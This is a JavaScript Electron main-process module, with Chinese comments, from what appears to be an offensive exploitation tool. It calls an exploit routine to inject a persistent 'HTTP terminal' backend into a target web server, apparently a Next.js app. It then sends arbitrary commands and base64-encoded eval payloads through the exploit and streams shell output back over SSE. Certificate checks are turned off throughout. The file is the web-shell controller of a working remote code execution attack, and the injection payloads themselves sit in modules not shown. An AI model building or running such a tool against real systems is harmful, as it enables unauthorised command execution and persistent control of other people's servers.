import { ipcMain } from 'electron'
import { executePOC } from './poc-handler.js'
import { injectHttpTerminalBackend } from './http-terminal-backend.js'
import { loadSettings } from './storage-handler.js'
import { createLogger } from './utils/logger.js'
import {
  TERMINAL_INJECT_FAILED,
  TERMINAL_SESSION_NOT_EXIST,
  TERMINAL_NOT_CONNECTED,
  TERMINAL_REQUEST_FAILED,
  TERMINAL_REQUEST_ERROR,
  TERMINAL_CONNECTION_FAILED,
  TERMINAL_CONNECTION_ERROR,
  TERMINAL_CONNECTION_NOT_EXIST
} from './error-codes.js'

const logger = createLogger('Terminal')

/**
 * 终端会话管理
 */
const terminalSessions = new Map()

/**
 * 创建新的终端会话 - 使用 HTTP SSE 方式
 */
async function createTerminalSession(sessionId, url, apiPath = '/_next/data/terminal') {
  try {
    logger.info('正在注入 HTTP 终端后端', { url, apiPath })
    const injectResult = await injectHttpTerminalBackend(url, apiPath)

    if (!injectResult.success) {
      return {
        success: false,
        error: injectResult.error || TERMINAL_INJECT_FAILED
      }
    }

    const apiUrl = `${url}${apiPath}`

    // 测试后端是否成功注入
    logger.debug('测试后端注入状态...')
    const testCommand = `__EVAL__:${Buffer.from(
      `
      try {
        JSON.stringify({ 
          injected: global.__httpTerminalInjected === true,
          path: global.__httpTerminalPath
        });
      } catch(e) {
        JSON.stringify({ injected: false, error: e.message });
      }
    `
    ).toString('base64')}`

    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    const testResult = await executePOC(url, testCommand, settings)
    logger.debug('后端测试结果', { content: testResult.digest_content?.substring(0, 100) })

    const testData = testResult.digest_content
    if (!testData || !testData.includes('"injected":true')) {
      logger.warn('终端后端可能未成功注入，这可能导致 HTTP 请求失败')
    }

    terminalSessions.set(sessionId, {
      url,
      apiUrl,
      apiPath,
      connected: true,
      history: [],
      backendInjected: true,
      mode: 'http'
    })

    logger.success('HTTP 终端后端注入成功', { sessionId, mode: 'http' })

    return {
      success: true,
      sessionId,
      apiUrl,
      apiPath,
      mode: 'http',
      message: 'HTTP 终端后端注入成功，前端需要调用 create action'
    }
  } catch (error) {
    logger.error('创建终端会话失败', error)
    return {
      success: false,
      error: error.message
    }
  }
}

/**
 * 执行终端命令
 */
async function executeTerminalCommand(sessionId, command) {
  const session = terminalSessions.get(sessionId)
  if (!session) {
    return {
      success: false,
      error: TERMINAL_SESSION_NOT_EXIST
    }
  }

  if (!session.connected) {
    return {
      success: false,
      error: TERMINAL_NOT_CONNECTED
    }
  }

  try {
    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    const result = await executePOC(session.url, command, settings)

    session.history.push({
      command,
      output: result.digest_content || result.response,
      timestamp: Date.now()
    })

    return {
      success: true,
      output: result.digest_content || '',
      isVulnerable: result.is_vulnerable,
      commandFailed: result.command_failed,
      failureReason: result.failure_reason
    }
  } catch (error) {
    return {
      success: false,
      error: error.message
    }
  }
}

/**
 * 关闭终端会话
 */
function closeTerminalSession(sessionId) {
  const session = terminalSessions.get(sessionId)
  if (session) {
    session.connected = false
    terminalSessions.delete(sessionId)
    return { success: true }
  }
  return { success: false, error: TERMINAL_SESSION_NOT_EXIST }
}

/**
 * 通过 HTTP 创建终端会话（避免 CORS）
 */
async function httpCreateSession(createUrl) {
  // 保存原始的 TLS 设置
  const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED

  try {
    logger.debug('HTTP 创建会话', { url: createUrl })

    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    // 如果需要忽略证书错误，在全局层面设置
    if (settings?.ignoreCertErrors) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'
    }

    const axios = (await import('axios')).default

    // 构建 axios 配置
    const axiosConfig = {
      timeout: settings?.timeout || 10000,
      validateStatus: () => true
    }

    // 如果需要忽略证书错误，配置 agent（仅对 https 协议）
    if (settings?.ignoreCertErrors && createUrl.startsWith('https://')) {
      const https = await import('https')
      const agent = new https.Agent({
        rejectUnauthorized: false,
        servername: undefined,
        checkServerIdentity: () => undefined
      })
      axiosConfig.httpsAgent = agent
    }

    const response = await axios.get(createUrl, axiosConfig)

    logger.http('GET', createUrl, response.status)
    logger.debug('HTTP 创建会话响应', { data: response.data })

    if (response.status === 200 && response.data) {
      // 如果返回的数据本身包含 success 字段，直接返回
      if (typeof response.data === 'object' && 'success' in response.data) {
        // 确保错误信息完整
        if (!response.data.success && !response.data.error) {
          response.data.error = TERMINAL_REQUEST_FAILED
        }
        return response.data
      }
      // 否则包装成功响应
      return {
        success: true,
        data: response.data
      }
    } else {
      return {
        success: false,
        error: `HTTP ${response.status}: ${response.statusText || TERMINAL_REQUEST_FAILED}`
      }
    }
  } catch (error) {
    logger.error('HTTP 创建会话失败', error)
    return {
      success: false,
      error: error.message || TERMINAL_REQUEST_ERROR
    }
  } finally {
    // 恢复原始的 TLS 设置
    if (originalRejectUnauthorized !== undefined) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized
    } else {
      delete process.env.NODE_TLS_REJECT_UNAUTHORIZED
    }
  }
}

/**
 * 通过 HTTP POST 发送终端输入
 */
async function httpSendInput(inputUrl, input) {
  // 保存原始的 TLS 设置
  const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED

  try {
    logger.debug('HTTP 发送输入', { url: inputUrl, inputLength: input?.length })

    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    // 如果需要忽略证书错误，在全局层面设置
    if (settings?.ignoreCertErrors) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'
    }

    const axios = (await import('axios')).default

    // 构建 axios 配置
    const axiosConfig = {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: settings?.timeout || 5000,
      validateStatus: () => true
    }

    // 如果需要忽略证书错误，配置 agent（仅对 https 协议）
    if (settings?.ignoreCertErrors && inputUrl.startsWith('https://')) {
      const https = await import('https')
      const agent = new https.Agent({
        rejectUnauthorized: false,
        servername: undefined,
        checkServerIdentity: () => undefined
      })
      axiosConfig.httpsAgent = agent
    }

    const response = await axios.post(inputUrl, { input }, axiosConfig)

    logger.http('POST', inputUrl, response.status)

    if (response.status === 200 && response.data) {
      // 如果返回的数据本身包含 success 字段，直接返回
      if (typeof response.data === 'object' && 'success' in response.data) {
        // 确保错误信息完整
        if (!response.data.success && !response.data.error) {
          response.data.error = TERMINAL_REQUEST_FAILED
        }
        return response.data
      }
      // 否则包装成功响应
      return {
        success: true,
        data: response.data
      }
    } else {
      return {
        success: false,
        error: `HTTP ${response.status}: ${response.statusText || TERMINAL_REQUEST_FAILED}`
      }
    }
  } catch (error) {
    logger.error('HTTP 发送输入失败', error)
    return {
      success: false,
      error: error.message || TERMINAL_REQUEST_ERROR
    }
  } finally {
    // 恢复原始的 TLS 设置
    if (originalRejectUnauthorized !== undefined) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized
    } else {
      delete process.env.NODE_TLS_REJECT_UNAUTHORIZED
    }
  }
}

/**
 * SSE 连接管理
 */
const sseConnections = new Map()

/**
 * 通过主进程连接 SSE（避免 CORS）
 */
async function connectSSE(streamUrl, webContents) {
  const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED

  try {
    logger.info('连接 SSE', { url: streamUrl })

    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    // 如果需要忽略证书错误
    if (settings?.ignoreCertErrors) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'
    }

    const axios = (await import('axios')).default

    // 构建 axios 配置
    const axiosConfig = {
      timeout: 0, // SSE 需要长连接
      responseType: 'stream',
      validateStatus: () => true
    }

    // 如果需要忽略证书错误，配置 agent（仅对 https 协议）
    if (settings?.ignoreCertErrors && streamUrl.startsWith('https://')) {
      const https = await import('https')
      const agent = new https.Agent({
        rejectUnauthorized: false,
        servername: undefined,
        checkServerIdentity: () => undefined
      })
      axiosConfig.httpsAgent = agent
    }

    const response = await axios.get(streamUrl, axiosConfig)

    logger.http('GET', streamUrl, response.status)
    logger.debug('SSE 响应头', { headers: response.headers })

    if (response.status !== 200) {
      return {
        success: false,
        error: `HTTP ${response.status}: ${response.statusText || TERMINAL_CONNECTION_FAILED}`
      }
    }

    // 检查响应头，警告可能的配置问题
    const connection = response.headers['connection']
    if (connection && connection.toLowerCase() === 'close') {
      logger.warn('服务器返回 Connection: close，SSE 连接可能会被提前关闭')
      logger.warn('这通常是 nginx 或其他反向代理的配置问题')
      logger.warn('建议在 nginx 配置中添加:')
      logger.warn('  proxy_set_header Connection "";')
      logger.warn('  proxy_http_version 1.1;')
      logger.warn('  proxy_buffering off;')
    }

    const connectionId = `sse-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`
    logger.debug('生成 SSE 连接 ID', { connectionId })

    // 保存连接信息
    sseConnections.set(connectionId, {
      stream: response.data,
      webContents,
      url: streamUrl
    })

    // 处理 SSE 数据流
    let buffer = ''
    let dataReceived = false

    response.data.on('data', (chunk) => {
      if (!dataReceived) {
        dataReceived = true
        logger.debug('SSE 开始接收数据')
      }

      buffer += chunk.toString('utf8')
      const lines = buffer.split('\n')
      buffer = lines.pop() || '' // 保留最后一个不完整的行

      for (const line of lines) {
        if (line.startsWith('data: ')) {
          const data = line.substring(6).trim()
          if (data) {
            logger.debug('收到 SSE 数据', { preview: data.substring(0, 100) })
            // 发送数据到渲染进程
            try {
              webContents.send('terminal:sse-message', {
                connectionId,
                data
              })
            } catch (error) {
              logger.error('发送 SSE 消息到渲染进程失败', error)
            }
          }
        }
      }
    })

    response.data.on('end', () => {
      logger.info('SSE 连接关闭', { connectionId })
      try {
        webContents.send('terminal:sse-close', { connectionId })
      } catch (error) {
        logger.error('发送 SSE 关闭事件失败', error)
      }
      sseConnections.delete(connectionId)
    })

    response.data.on('error', (error) => {
      logger.error('SSE 流错误', error)

      // 如果是连接重置错误，可能是正常的连接关闭
      if (error.code === 'ECONNRESET') {
        logger.debug('SSE 连接被服务器关闭（可能是正常关闭）')
        try {
          webContents.send('terminal:sse-close', { connectionId })
        } catch (err) {
          logger.error('发送 SSE 关闭事件失败', err)
        }
      } else {
        // 其他错误才发送错误事件
        try {
          webContents.send('terminal:sse-error', {
            connectionId,
            error: error.message
          })
        } catch (err) {
          logger.error('发送 SSE 错误事件失败', err)
        }
      }
      sseConnections.delete(connectionId)
    })

    // 立即发送连接成功事件
    logger.success('SSE 连接建立成功', { connectionId })
    try {
      webContents.send('terminal:sse-open', { connectionId })
    } catch (error) {
      logger.error('发送 SSE open 事件失败', error)
    }

    return {
      success: true,
      connectionId
    }
  } catch (error) {
    logger.error('SSE 连接失败', error)
    return {
      success: false,
      error: error.message || TERMINAL_CONNECTION_ERROR
    }
  } finally {
    // 恢复原始的 TLS 设置
    if (originalRejectUnauthorized !== undefined) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized
    } else {
      delete process.env.NODE_TLS_REJECT_UNAUTHORIZED
    }
  }
}

/**
 * 关闭 SSE 连接
 */
function closeSSE(connectionId) {
  const connection = sseConnections.get(connectionId)
  if (connection) {
    try {
      connection.stream.destroy()
      logger.info('SSE 连接已关闭', { connectionId })
    } catch (error) {
      logger.error('关闭 SSE 连接失败', error)
    }
    sseConnections.delete(connectionId)
    return { success: true }
  }
  return { success: false, error: TERMINAL_CONNECTION_NOT_EXIST }
}

/**
 * 注册终端相关的 IPC 处理器
 */
export function registerTerminalHandlers() {
  ipcMain.handle('terminal:create', async (_event, { url, apiPath }) => {
    const sessionId = `terminal-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`
    return createTerminalSession(sessionId, url, apiPath || '/_next/data/terminal')
  })

  ipcMain.handle('terminal:createSession', async (_event, { createUrl }) => {
    return httpCreateSession(createUrl)
  })

  ipcMain.handle('terminal:sendInput', async (_event, { inputUrl, input }) => {
    return httpSendInput(inputUrl, input)
  })

  ipcMain.handle('terminal:connectSSE', async (event, { streamUrl }) => {
    return connectSSE(streamUrl, event.sender)
  })

  ipcMain.handle('terminal:closeSSE', async (_event, { connectionId }) => {
    return closeSSE(connectionId)
  })

  ipcMain.handle('terminal:execute', async (_event, { sessionId, command }) => {
    return executeTerminalCommand(sessionId, command)
  })

  ipcMain.handle('terminal:close', async (_event, { sessionId }) => {
    return closeTerminalSession(sessionId)
  })

  ipcMain.handle('terminal:getSession', async (_event, { sessionId }) => {
    const session = terminalSessions.get(sessionId)
    if (session) {
      return {
        success: true,
        session: {
          url: session.url,
          connected: session.connected,
          historyCount: session.history.length
        }
      }
    }
    return { success: false, error: TERMINAL_SESSION_NOT_EXIST }
  })
}
